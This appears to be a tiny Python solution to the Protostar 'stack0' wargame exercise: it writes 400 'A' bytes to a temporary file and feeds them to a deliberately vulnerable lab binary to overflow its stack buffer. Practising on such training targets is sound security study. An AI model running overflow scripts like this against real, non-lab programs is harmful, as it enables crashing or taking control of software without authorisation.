
import os

sploit = "A"*400
with open("/tmp/stack0_sploit", "wb") as f:
	f.write(sploit)

os.system("/opt/protostar/bin/stack0 < /tmp/stack0_sploit")

os.remove("/tmp/stack0_sploit")

